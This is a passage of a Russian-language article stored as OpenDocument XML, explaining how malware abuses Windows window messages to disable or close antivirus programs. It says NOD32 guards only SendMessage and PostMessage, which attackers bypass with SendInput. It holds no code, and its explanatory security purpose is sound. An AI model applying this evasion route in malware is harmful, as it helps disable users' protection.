      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T1">&gt;&gt;&gt; </text:span>врезка защита от <text:span text:style-name="T1">WM_ </text:span>атак</text:h>
      <text:p text:style-name="P13">Оконная подсистема <text:span text:style-name="T1">Windows </text:span>позволяет любому приложению независимо от его уровня привилегий посылать сообщения (<text:span text:style-name="T1">Windows Message </text:span>или сокращенно <text:span text:style-name="T1">WM_)</text:span> окнам более привилегированных приложений, имитируя клавиатурный и/или мышиный ввод. Достаточно многие вирусы отключают <text:span text:style-name="T1">pro</text:span>активные антивирусные защиты через пользовательский интерфейс или периодически просматривают список окон, закрывая окно известного им антивируса при его обнаружении, что делает невозможным локальное сканирование файловой системы. И хотя сканирование по сети все еще остается возможным, оно принципиально не способно обнаружить маскирующиеся вирусы и <text:span text:style-name="T1">rootkit'</text:span>ы.</text:p>
      <text:p text:style-name="P13">Единственный антивирус, который предпринимает попытки защиты от <text:span text:style-name="T1">WM_ </text:span>атак — это <text:span text:style-name="T1">NOD32</text:span>, хотя хакеры уже давно научились обходить его используя низкоуровневые функции имитации ввода (<text:span text:style-name="T1">NOD32 </text:span>защищается только от посылки сообщений посредством <text:span text:style-name="T1">API-</text:span>функций <text:span text:style-name="T1">SendMessage </text:span>и <text:span text:style-name="T1">PostMessage</text:span>, но "забывает" про документированную <text:span text:style-name="T1">API-</text:span>функцию SendInput, описание которой содержится в <text:span text:style-name="T1">Platform SD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body2"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5-02T16:59:00</dc:date>
    <meta:editing-cycles>95</meta:editing-cycles>
    <meta:editing-duration>PT3H6M</meta:editing-duration>
    <meta:document-statistic meta:table-count="1" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="181" meta:word-count="1160" meta:character-count="8227" meta:non-whitespace-character-count="7176"/>
    <meta:generator>LibreOffice/5.1.4.2$Windows_x86 LibreOffice_project/f99d75f39f1c57ebdd7ffc5f42867c12031db97a</meta:generator>
  </office:meta>
</office:document-meta>
</file>